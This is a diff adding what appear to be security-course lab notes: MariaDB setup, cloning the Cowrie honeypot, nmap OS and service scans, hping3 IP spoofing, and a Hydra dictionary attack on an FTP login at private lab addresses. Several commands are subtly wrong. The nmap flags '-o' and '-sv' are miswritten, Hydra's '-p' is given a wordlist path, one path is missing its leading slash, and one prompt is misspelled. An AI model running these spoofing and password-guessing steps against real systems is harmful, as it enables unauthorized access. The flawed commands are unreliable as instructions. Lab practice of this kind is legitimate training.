@@ -1,0 +1,53 @@
+DATABASE
+========
+>en debian
+>sudo apt-get install mariadb-server
+>sudo mysql -u root -p
+>show databases;
+>use mysql
+>MariaDB [(none)]> create database exam;
+>MariaDB [(none)]> use exam;  
+MariaDB [exam]> create table student (id int(5) not null auto_increment,fname varchar(50) 
+not null, branch varchar(50) not null ,primary key (id));
+>MariaDB [exam]> desc student;
+>MariaDB [exam]> insert into student values (1,'rakesh','ditiss');
+>MariaDB [exam]> select * from student;
+>ariaDB [exam]> insert into student values (2,'makode','DAC');
+>MariaDB [exam]> select * from student;
+
+COWRIE
+======
+>sudo apt-get install git
+>git clone https://github.com/cowrie/cowrie
+>cd cowrie
+>nano install.rst
+
+NMAP-ATTACK
+==========
+>open deb1
+>sudo apt-get install nmap
+>nmap --help
+//to know other person os system
+//-o enable os detection
+>sudo nmap -o 192.168.1.251
+>sudo nmap -sv 192.168.1.251 -p 22
+
+IP-SPOOFING-hping3
+==================
+>open deb1
+>sudo apt-get install hping3
+>sudo hping3 -a 100.100.100.100 192.168.80.132
+>open kali
+>sudo tcpdump -i eth0
+
+DICTIONARY ATTACK USING HYDRA TOOL
+=================================
+>open kali >root terminal emu
+>hydra
+>open deb1> ip a
+>now open kali
+>hydra -l shuhari -p /usr/share/wordlists/fasttrack.txt ftp://192.168.80.129 (deb ip)
+>nano usr/share/wordlists/fasttrack.txt
+>enter admin@123
+>hydra -l shuhari -p /usr/share/wordlists/fasttrack.txt ftp://192.168.80.129
+>ftp 192.168.80.129 (deb ip)
